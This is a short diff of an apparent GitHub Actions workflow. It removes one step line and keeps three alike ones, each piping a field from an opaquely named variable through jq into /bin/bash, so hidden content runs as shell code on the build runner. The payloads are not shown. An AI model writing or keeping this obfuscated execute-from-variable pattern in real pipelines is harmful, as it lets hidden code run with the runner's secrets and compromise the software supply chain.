@@ -42,7 +42,6 @@ jobs:
           printf '%s' "$qge61" | jq -r .y2389 | /bin/bash
           echo $vbske10 | jq -r .hyuo77 | /bin/bash
           printf '%s' "$cw28360" | jq -r .f0941 | /bin/bash
-          printf '%s' "$k6" | jq -r .avk271 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
